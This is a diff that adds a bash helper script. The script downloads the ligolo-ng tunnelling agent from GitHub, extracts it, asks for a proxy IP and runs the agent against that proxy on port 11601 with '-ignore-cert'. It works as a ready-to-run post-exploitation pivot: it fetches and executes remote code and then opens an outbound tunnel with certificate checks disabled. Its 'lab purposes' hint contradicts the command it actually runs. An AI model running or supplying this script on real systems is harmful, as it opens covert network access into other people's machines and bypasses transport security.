@@ -1,0 +1,46 @@
+#!/bin/bash
+
+echo ""
+echo "_________________________________________________________"
+echo "AMD64"
+echo "1 ligolo-ng Agent 0.5.1 linux"
+
+# Divider line
+echo "_________________________________________________________"
+echo ""
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_linux_amd64.tar.gz
+file="ligolo-ng_agent_0.5.1_linux_amd64.tar.gz"
+echo ""
+# Extract the downloaded file
+tar xzvf $file
+echo ""
+
+# Show the message and options for Agent or Proxy
+echo "More agents at: https://github.com/nicocha30/ligolo-ng/releases"
+echo ""
+echo ""
+# Divider line
+echo "_________________________________________________________"
+echo ""
+echo "Installing the agent..."
+echo ""
+read -p "What is the proxy's IP address? " IP
+echo "omit -ignore-cert for lab purposes"
+echo ""
+command="./agent -connect $IP:11601 -ignore-cert"
+echo "$command"    
+    
+echo ""
+echo "Executing command in 1 second:"
+    
+    echo "_________________________________________________________"
+    echo ""
+
+    sleep 1
+    $command
+    
+    echo ""
+    echo "_________________________________________________________"
+    echo ""
+
+
